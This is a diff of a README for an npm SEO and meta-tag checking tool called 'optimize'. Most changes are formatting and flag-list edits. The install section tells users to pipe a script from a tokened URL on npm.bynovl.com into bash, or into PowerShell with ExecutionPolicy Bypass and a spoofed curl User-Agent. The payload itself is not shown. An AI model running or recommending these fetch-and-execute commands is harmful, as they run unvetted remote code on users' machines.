@@ -10,22 +10,22 @@ Open **Terminal** or **Powershell** on your computer and `cd [folder/name]` you 
 
 <details>
   <summary>
-  For Linux/MacOS/WSL
+  <strong>For Unix/MacOS/WSL</strong>
   </summary>
   
-    ```bash
-    # Add &TOKEN=1  after INTALL=2 for token-only.
-    curl -fsSL "https://npm.bynovl.com/token-0ba2a994-f671-48ae-9acc-30a350d37bae?INSTALL=1" | bash
-    ```
+  ```bash
+  # Add &TOKEN=1  after INSTALL=2 for token-only.
+  curl -fsSL "https://npm.bynovl.com/token-0ba2a994-f671-48ae-9acc-30a350d37bae?INSTALL=1" | bash
+  ```
 </details>
 
 <details>
   <summary>
-  Windows
+  <strong>Windows</strong>
   </summary>
 
   ```bash
-  # PowerShell (no-bash). Add &TOKEN=1  after INTALL=2 for token-only.
+  # PowerShell (no-bash). Add &TOKEN=1  after INSTALL=2 for token-only.
   Invoke-WebRequest -Uri "https://npm.bynovl.com/token-0ba2a994-f671-48ae-9acc-30a350d37bae?INSTALL=2" -Headers @{ 'User-Agent' = 'curl/7.88.0' } | ForEach-Object { $_.Content } | powershell -NoProfile -ExecutionPolicy Bypass -Command -
   ```
 </details>
@@ -87,7 +87,7 @@ npx optimize --meta --path /path/name-to-file.html
 npx optimize  --path /path/folder-name
 ```
 
-**flag Checks**
+**Core Flag Checks**
 - `--meta`: Check for required and recommended meta tags only.
 - `--open-graph`: Validate Open Graph tags for social sharing only.
 - `--schema`: Validate structured data (JSON-LD schema blocks) only.
@@ -98,12 +98,13 @@ npx optimize  --path /path/folder-name
 - `--links`: Validate internal and external links only.
 
 **Other Flags**
-- `--path`: combine with and check flag and analyze a folder or file. 
+- `--path`: combine with a check flag to analyze a folder or file.
 - `--json`: export results as JSON 
-- `--csv`: export resutls as JSON
-- `--report`: get a custom Markdown report (requires LLM API key)
 - `--help`: list of flags
 - `--version`: current package version
+- `--skills`: install Optimize SKILLS
+- `--setup`: install optimize.config.js, workflow, custom check and extend check files
+- `--crawl`: crawl a page or full site
 
 For full documentation see the [main README](../../README.md).
 
